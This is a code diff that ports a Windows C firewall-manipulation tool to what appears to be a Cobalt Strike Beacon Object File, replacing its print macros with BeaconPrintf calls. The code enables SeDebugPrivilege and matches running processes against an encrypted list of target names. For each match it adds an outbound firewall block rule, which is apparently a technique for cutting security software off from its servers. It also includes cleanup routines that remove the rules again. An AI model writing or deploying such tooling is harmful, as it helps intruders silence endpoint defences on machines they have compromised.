@@ -1,9 +1,4 @@
-#include <initguid.h> // Must be included first to define GUIDs
-#include "firewall.h"
-#define _WIN32_DCOM
-#include <windows.h>
-#include <strsafe.h>
-#include "errors.h"
+#include "common.h"
 
 /*
  * firewall.c
@@ -44,13 +39,13 @@ static BSTR AnsiToBSTR(const char* input) {
 static HRESULT InitializeFirewallApi(INetFwPolicy2** ppFwPolicy) {
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
-        EPRINTF("[-] COM initialization failed: 0x%lX\n", hr);
+        BeaconPrintf(CALLBACK_ERROR, "[-] COM initialization failed: 0x%lX\n", hr);
         return hr;
     }
     
     hr = CoCreateInstance(&CLSID_NetFwPolicy2, NULL, CLSCTX_INPROC_SERVER, &IID_INetFwPolicy2, (void**)ppFwPolicy);
     if (FAILED(hr)) {
-        EPRINTF("[-] Failed to create INetFwPolicy2 instance: 0x%lX\n", hr);
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create INetFwPolicy2 instance: 0x%lX\n", hr);
         CoUninitialize();
     }
     return hr;
@@ -81,19 +76,19 @@ static void CheckFirewallState(INetFwPolicy2* pFwPolicy) {
     if (currentProfiles & NET_FW_PROFILE2_DOMAIN) {
         VARIANT_BOOL enabled;
         if (SUCCEEDED(pFwPolicy->lpVtbl->get_FirewallEnabled(pFwPolicy, NET_FW_PROFILE2_DOMAIN, &enabled)) && enabled == VARIANT_FALSE) {
-            PRINTF("[!] Warning: Firewall is disabled for the Domain profile.\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Warning: Firewall is disabled for the Domain profile.\n");
         }
     }
     if (currentProfiles & NET_FW_PROFILE2_PRIVATE) {
         VARIANT_BOOL enabled;
         if (SUCCEEDED(pFwPolicy->lpVtbl->get_FirewallEnabled(pFwPolicy, NET_FW_PROFILE2_PRIVATE, &enabled)) && enabled == VARIANT_FALSE) {
-            PRINTF("[!] Warning: Firewall is disabled for the Private profile.\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Warning: Firewall is disabled for the Private profile.\n");
         }
     }
     if (currentProfiles & NET_FW_PROFILE2_PUBLIC) {
         VARIANT_BOOL enabled;
         if (SUCCEEDED(pFwPolicy->lpVtbl->get_FirewallEnabled(pFwPolicy, NET_FW_PROFILE2_PUBLIC, &enabled)) && enabled == VARIANT_FALSE) {
-            PRINTF("[!] Warning: Firewall is disabled for the Public profile.\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[!] Warning: Firewall is disabled for the Public profile.\n");
         }
     }
 }
@@ -161,7 +156,7 @@ void FirewallAddRuleByPath(const char* processPath) {
     }
 
     if (FirewallRuleExists(pFwPolicy, wProcessPath)) {
-        WPRINTF(L"[!] Firewall rule for %s already exists. Skipping.\n", wProcessPath);
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] Firewall rule for %ls already exists. Skipping.\n", wProcessPath);
     } else {
         INetFwRule* pFwRule = NULL;
         HRESULT hr = CoCreateInstance(&CLSID_NetFwRule, NULL, CLSCTX_INPROC_SERVER, &IID_INetFwRule, (void**)&pFwRule);
@@ -192,9 +187,9 @@ void FirewallAddRuleByPath(const char* processPath) {
             if(SUCCEEDED(pFwPolicy->lpVtbl->get_Rules(pFwPolicy, &pFwRules))) {
                 hr = pFwRules->lpVtbl->Add(pFwRules, pFwRule);
                 if (SUCCEEDED(hr)) {
-                    WPRINTF(L"[+] Firewall block rule added for %s.\n", wProcessPath);
+                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Firewall block rule added for %ls.\n", wProcessPath);
                 } else {
-                    EPRINTF("[-] Failed to add firewall rule. Error: 0x%lX\n", hr);
+                    BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add firewall rule. Error: 0x%lX\n", hr);
                 }
                 pFwRules->lpVtbl->Release(pFwRules);
             }
@@ -216,7 +211,7 @@ void FirewallAddRuleByPath(const char* processPath) {
  * and adds grouped outbound block rules per match. Prints warnings if firewall is disabled.
  */
 void FirewallConfigureBlockRules() {
-    if (!EnableSeDebugPrivilege()) { EPRINTF("[-] Failed to enable SeDebugPrivilege.\n"); return; }
+    if (!EnableSeDebugPrivilege()) { BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable SeDebugPrivilege.\n"); return; }
     
     INetFwPolicy2* pFwPolicy = NULL;
     if (FAILED(InitializeFirewallApi(&pFwPolicy))) return;
@@ -238,8 +233,9 @@ void FirewallConfigureBlockRules() {
         if (Process32First(hSnapshot, &pe32)) {
             do {
                 for (size_t i = 0; i < PROCESS_DATA_COUNT; i++) {
-                    if (decryptedNames[i] && lstrcmpiA(pe32.szExeFile, decryptedNames[i]) == 0) {
-                        PRINTF("[+] Found target process: %s\n", pe32.szExeFile);
+                    wchar_t wDecryptedName[MAX_PATH];
+                        if (decryptedNames[i] && MultiByteToWideChar(CP_ACP, 0, decryptedNames[i], -1, wDecryptedName, MAX_PATH) > 0 && lstrcmpiW(pe32.szExeFile, wDecryptedName) == 0) {
+                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found target process: %s\n", pe32.szExeFile);
                         WCHAR fullPathW[MAX_PATH];
                         char fullPathA[MAX_PATH];
                         if (getProcessFullPath(pe32.th32ProcessID, fullPathW, MAX_PATH)) {
@@ -277,7 +273,7 @@ void FirewallRemoveAllRules() {
     long ruleCount = 0;
     pFwRules->lpVtbl->get_Count(pFwRules, &ruleCount);
     if (ruleCount == 0) {
-        PRINTF("[+] No firewall rules to process.\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] No firewall rules to process.\n");
         pFwRules->lpVtbl->Release(pFwRules);
         UninitializeFirewallApi(pFwPolicy);
         return;
@@ -316,9 +312,9 @@ void FirewallRemoveAllRules() {
     }
     
     if (removedCount > 0) {
-        PRINTF("[+] Removed %lu firewall rule(s) created by this tool.\n", removedCount);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Removed %lu firewall rule(s) created by this tool.\n", removedCount);
     } else {
-        PRINTF("[+] No firewall rules from this tool were found to remove.\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] No firewall rules from this tool were found to remove.\n");
     }
 
     pFwRules->lpVtbl->Release(pFwRules);
@@ -340,10 +336,10 @@ void FirewallRemoveRuleByName(const char* ruleName) {
         BSTR bstrRuleName = AnsiToBSTR(ruleName);
         if (bstrRuleName) {
             if (SUCCEEDED(pFwRules->lpVtbl->Remove(pFwRules, bstrRuleName))) {
-                PRINTF("[+] Successfully removed firewall rule: %s\n", ruleName);
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully removed firewall rule: %s\n", ruleName);
             } else {
                 // This error is expected if the rule doesn't exist, so no need to be verbose unless debugging.
-                // EPRINTF("[-] Rule '%s' not found or could not be removed.\n", ruleName);
+                // BeaconPrintf(CALLBACK_ERROR, "[-] Rule '%s' not found or could not be removed.\n", ruleName);
             }
             SysFreeString(bstrRuleName);
         }
